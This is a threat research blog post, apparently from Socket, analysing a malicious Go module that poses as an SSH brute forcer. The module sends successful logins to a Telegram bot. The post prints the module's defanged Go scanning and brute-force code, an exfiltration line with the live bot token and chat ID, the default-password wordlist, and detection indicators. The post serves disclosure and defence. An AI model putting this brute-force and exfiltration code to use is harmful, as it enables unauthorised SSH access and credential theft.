---
title: "Malicious Go Module Disguised as SSH Brute Forcer Exfiltrates Credentials via Telegram"
short_title: "Malicious Go Module Exfiltrates Credentials via Telegram"
date: 2025-08-21 12:00:00 +0000
categories: [Go]
tags: [Go, SSH, Infostealer, Brute Force, IoT, Russian Threat Actor, T1195.002, T1608.001, T1204.002, T1046, T1110.001, T1021.004, T1071.001, T1567]
canonical_url: https://socket.dev/blog/malicious-go-module-disguised-as-ssh-brute-forcer-exfiltrates-credentials
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/2443dca395c1276243c45c878b27348880dc1a1b-1024x1024.png
  alt: "Malicious Go Module Disguised as SSH Brute Forcer"
description: "A malicious Go module posing as an SSH brute forcer exfiltrates stolen credentials to a Telegram bot controlled by a Russian-speaking threat actor."
---

Socket's Threat Research Team identified a malicious Go module package, [`golang-random-ip-ssh-bruteforce`](https://socket.dev/go/package/github.com/illdieanyway/golang-random-ip-ssh-bruteforce?version=v0.0.0-20220624110449-9d819518d4fc), that poses as a fast SSH brute forcer but covertly exfiltrates credentials to its author. On the first successful login, the package sends the target IP address, username, and password to a hardcoded Telegram bot controlled by the threat actor.

The package is designed to continuously scan random IPv4 addresses for exposed SSH services on TCP port 22, attempt authentication using a local username-password wordlist, and exfiltrate any successful credentials via Telegram. As a result, anyone who runs the package hands over their initial access wins to the Russian-speaking threat actor, known as `IllDieAnyway` on [GitHub](https://github.com/IllDieAnyway) and within the [Go Module](https://pkg.go.dev/github.com/illdieanyway/golang-random-ip-ssh-bruteforce@v0.0.0-20220624110449-9d819518d4fc) ecosystem.

At the time of writing, the malicious package remains live on Go Module and GitHub. We petitioned for its removal and the suspension of the publisher's accounts.

![Socket AI scanner detection](https://cdn.sanity.io/images/cgdhsj6q/production/9ef51718a184ad522c84de581b51a0a08a479874-1569x793.png)
_Socket's AI scanner detected a malicious package `golang-random-ip-ssh-bruteforce`. It was originally published on June 24, 2022, more than three years ago._

## Inside the Malicious Package

The code in `golang-random-ip-ssh-bruteforce` runs an infinite [loop](https://socket.dev/go/package/github.com/illdieanyway/golang-random-ip-ssh-bruteforce?section=files&version=v0.0.0-20220624110449-9d819518d4fc&path=scanner.go#L135) that generates random IPv4 addresses, probes TCP 22 with a short timeout, and on an open port launches concurrent SSH logins from a local [wordlist](https://socket.dev/go/package/github.com/illdieanyway/golang-random-ip-ssh-bruteforce?section=files&version=v0.0.0-20220624110449-9d819518d4fc&path=wl.txt). It sets [`HostKeyCallback: ssh.InsecureIgnoreHostKey()`](https://socket.dev/go/package/github.com/illdieanyway/golang-random-ip-ssh-bruteforce?section=files&version=v0.0.0-20220624110449-9d819518d4fc&path=scanner.go#L73) to skip server identity checks. On the first successful authentication, it sends the target IP, username, and password to a hardcoded Telegram bot and chat controlled by the threat actor, then signals success and exits.

Below is the threat actor's [code](https://socket.dev/go/package/github.com/illdieanyway/golang-random-ip-ssh-bruteforce?section=files&version=v0.0.0-20220624110449-9d819518d4fc&path=scanner.go), defanged and with our added comments highlighting malicious functionality and intent.

```go
// Probe the host on TCP 22. If the port is reachable, launch brute forcing.
func IsOpened(host string) {
    target := fmt.Sprintf("%s:%d", host, 22)
    conn, err := net.DialTimeout("tcp", target, 2*time.Second)
    if err == nil && conn != nil {
        conn.Close()
        go brute(host)
    }
}

// Configure SSH to skip host key verification, then attempt user:pass.
sshConfig := &ssh.ClientConfig{
    User: user,
    Auth: []ssh.AuthMethod{ssh.Password(pass)},
    Timeout: time.Duration(timeout) * time.Second,
    HostKeyCallback: ssh.InsecureIgnoreHostKey(), // Skip server verification.
}
client, err := ssh.Dial("tcp", addr, sshConfig)

// On first success, send stolen credentials to the threat actor's Telegram.
data := addr + ":" + user + ":" + pass + "</code>"
http.Get("https://api[.]telegram[.]org/bot5479006055:AAHaTwYmEhu4YlQQxriW00a6CIZhCfPQQcY/sendMessage?chat_id=1159678884&parse_mode=HTML&text=<code>" + data)
close(succ) // Signal success and exit.
```

The Telegram API returns `"ok": true` with a valid `message_id` for chat `1159678884`, confirming end to end delivery. The hardcoded exfiltration endpoint is `https://api.telegram[.]org/bot5479006055:AAHaTwYmEhu4YlQQxriW00a6CIZhCfPQQcY/sendMessage?chat_id=1159678884`. At the time of writing, the bot token `5479006055:AAHaTwYmEhu4YlQQxriW00a6CIZhCfPQQcY` is live, and Telegram identifies the bot as `ssh_bot` with username `@sshZXC_bot`. The destination chat `1159678884` is a private chat with `@io_ping` (alias `Gett`). With both token and chat active, any first successful login will be sent as `ip:user:pass` to `@io_ping` via `@sshZXC_bot`.

![Telegram bot and user info](https://cdn.sanity.io/images/cgdhsj6q/production/ad84648be5ba724180d29353006980ac1910d601-1394x868.png)
_Left: Telegram Bot Info confirms the exfiltration bot is active: name `ssh_bot`, username `@sshZXC_bot`. Right: Telegram User Info confirms active destination account: user `Gett`, username `@io_ping`, which maps to `chat_id` `1159678884`._

## Local Wordlist

The `golang-random-ip-ssh-bruteforce` Go package includes a short, static [wordlist](https://socket.dev/go/package/github.com/illdieanyway/golang-random-ip-ssh-bruteforce?section=files&version=v0.0.0-20220624110449-9d819518d4fc&path=wl.txt). This design lowers noise, speeds scanning, and preserves plausible deniability. The package does not fetch updates or credentials over the network, so it can run offline until a hit, then beacon once to Telegram.

The file pairs only two usernames, `root` and `admin`, with weak or default passwords. Entries include `toor`, `raspberry`, `dietpi`, `alpine`, `password`, `qwerty`, numeric sequences, and role terms such as `webadmin`, `webmaster`, `maintenance`, `techsupport`, `marketing`, and `uploader`. Some of these choices indicate indiscriminate targeting of exposed SSH services, especially small servers, internet of things (IoT) devices and single-board computer (SBC) images, network appliances, and hastily provisioned Linux hosts where defaults persist.

Items like `raspberry` and `dietpi` map to common Pi and minimal OS images, `toor` is a historical default in security distributions, and `alpine` aligns with lightweight appliance builds. Overall, the list favors breadth over depth, matching the code's exit-on-first-success behavior and immediate credential exfiltration.

![Embedded SSH brute force wordlist](https://cdn.sanity.io/images/cgdhsj6q/production/ff99cfa3a276db413e09f47e1c3d64977d7daa31-1161x930.png)
_Socket AI Scanner's view of the malicious `golang-random-ip-ssh-bruteforce` package shows an embedded SSH brute force wordlist (`wl.txt`). It pairs `root` and `admin` with weak defaults like `root`, `toor`, `raspberry`, `dietpi`, `alpine`, `123456`, `webadmin`, and `webmaster`, confirming credential-guessing intent._

## Threat Actor's Strategy

The strategy is straightforward and effective. Release a "fast" offensive utility, then hardcode an exfiltration endpoint for every success. The package offloads scanning and password guessing to unwitting operators, spreads risk across their IPs, and funnels the successes to a single threat actor-controlled Telegram bot. It disables host key verification, drives high concurrency, and exits after the first valid login to prioritize quick capture. Because the Telegram Bot API uses HTTPS, the traffic looks like normal web requests and can slip past coarse egress controls.

The threat actor's GitHub [account](https://github.com/IllDieAnyway) hosts the brute forcer and other offensive utilities, including fast port scanners, a phpMyAdmin brute forcer, Selica-C2, and a crawler based DDoS tool. Several of `IllDieAnyway`'s repositories advertise Telegram callbacks or include bot tooling, which follows the same operational pattern. In particular, the [`phpMyAdmin-Bruteforce-Fast`](https://github.com/IllDieAnyway/PhpMyAdmin-Bruteforce-Fast) repository explicitly claims multithreaded bruteforce with Telegram callback. That mirrors `golang-random-ip-ssh-bruteforce`, which hardcodes a Telegram endpoint and exfiltrates credentials on success.

![Threat actor GitHub profile](https://cdn.sanity.io/images/cgdhsj6q/production/60f0d7bc3818e7ab0184728005908d5220753b14-1041x933.png)

> *Threat actor's GitHub [profile](https://github.com/IllDieAnyway), under the username `IllDieAnyway` (alias `G3TT`) hosts an offensive toolkit: `Telegram Bot Client`, `Fortnite AI Hack`, `PhpMyAdmin-Bruteforce-Fast` with Telegram callback, `crawler-ddos`, `Fast-Portscanner`, `random-ip-port-scanner`, `Selica-C2`, and `golang-random-ip-ssh-bruteforce`. We confirmed `golang-random-ip-ssh-bruteforce` is malicious with hardcoded Telegram exfiltration; based on our current review, we have not identified comparable operator-focused backdoors in the other repositories.*

The threat actor maintains an SSH credential harvester and a C2 framework `Selica-C2`. Used together, these tools enable building a botnet of SSH-reachable hosts. We found no code-level linkage between `golang-random-ip-ssh-bruteforce` and `Selica-C2`. Conclusive proof would require shared identifiers or observed post-exploitation that installs and enrolls a `Selica-C2` bot.

We assess with high confidence that `IllDieAnyway` is a Russian-speaking threat actor. This conclusion is based on consistent Russian-language artifacts across the threat actor's GitHub repositories, including full READMEs and UI content written in Russian, such as the `telegram-bot-client` repository. The threat actor has also published tooling specific to VKontakte (VK), a social network predominantly used in Russian-speaking regions. One such repository, `vk_inviter`, automates activity in VK chats and includes usage instructions exclusively in Russian. While language use is not definitive proof of nationality or location, the volume and specificity of Russian-language materials, combined with VK-specific tooling and cross-platform alias correlation, support a high-confidence assessment that the threat actor is Russian-speaking.

## Impact Assessment

Running the `golang-random-ip-ssh-bruteforce` package exposes the operator to legal and operational risk. Port scanning and credential guessing can violate laws and acceptable use policies, and ISPs or cloud providers often blacklist sources that perform them.

Each success captures the target IP, username, and password, enough to open SSH sessions, drop payloads, and pivot. Exfiltration uses a hardcoded Telegram bot token and chat ID, so only the threat actor `IllDieAnyway`, who controls `@sshZXC_bot` and the chat `@io_ping`, receives the stolen data. The package exfiltrates on the first successful login per run. If the operator runs it again or relaunches it, each new success will be sent to the same Telegram chat.

Unauthorized SSH access remains a high-value commodity on the criminal underground. We previously [documented](https://socket.dev/blog/malicious-npm-packages-inject-ssh-backdoors-via-typosquatted-libraries) how SSH accesses are traded across dark web and used for espionage, illicit mining, and ransomware staging.

## Outlook and Recommendations

This case reflects a growing class of offensive utilities that pose as helpful tools and expose operators to legal and operational risk.

- Treat any offensive utility from an untrusted account as hostile until proven otherwise, and review its code before execution.
- Tighten supply chain hygiene: require review before running third-party tools and verify transitive dependencies.
- Enforce egress controls that block or closely monitor traffic to messaging APIs, and disable outbound SSH from non-server networks.
- Deploy detections for the observed patterns: references to Telegram Bot API endpoints, use of `ssh.InsecureIgnoreHostKey`, and the packaged `wl.txt` credential pairs.

Socket blocks operator-hostile code before it reaches your projects or build systems. The **[Socket GitHub App](https://socket.dev/features/github)** scans pull requests in real time and enforces policy, flagging risky behaviors like network access, post-install scripts, obfuscation, and embedded binaries. The **[Socket CLI](https://socket.dev/features/cli)** adds guardrails during installs and in CI, and the **[Socket browser extension](https://chromewebstore.google.com/detail/socket-security/jbcobpbfgkhmjfpjjepkcocalmpkiaop)** surfaces security context across the web so you avoid risky packages before adoption. For teams using AI assistants, **[Socket MCP](https://socket.dev/blog/socket-mcp)** screens LLM-suggested dependencies. Together these controls create a continuous, developer-first defense that keeps malicious packages out of your supply chain.

## Indicators of Compromise (IOCs)

### Malicious Go Package

- [`golang-random-ip-ssh-bruteforce`](https://socket.dev/go/package/github.com/illdieanyway/golang-random-ip-ssh-bruteforce?version=v0.0.0-20220624110449-9d819518d4fc)

### Threat Actor's Alias and GitHub

- `IllDieAnyway`
- `https://github[.]com/IllDieAnyway`

### Exfiltration Endpoint

- `https://api[.]telegram[.]org/bot5479006055:AAHaTwYmEhu4YlQQxriW00a6CIZhCfPQQcY/sendMessage?chat_id=1159678884&parse_mode=HTML&text=<code>`

### Telegram Identifiers

- Bot token: `5479006055:AAHaTwYmEhu4YlQQxriW00a6CIZhCfPQQcY`
- Bot name and handle: `ssh_bot` (`@sshZXC_bot`)
- Destination chat_id: `1159678884`
- Destination user: `Gett` (`@io_ping`)

## MITRE ATT&CK Techniques

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1608.001 — Stage Capabilities: Upload Malware
- T1204.002 — User Execution: Malicious File
- T1046 — Network Service Discovery
- T1110.001 — Brute Force: Password Guessing
- T1021.004 — Remote Services: SSH
- T1071.001 — Application Layer Protocol: Web Protocols
- T1567 — Exfiltration Over Web Service
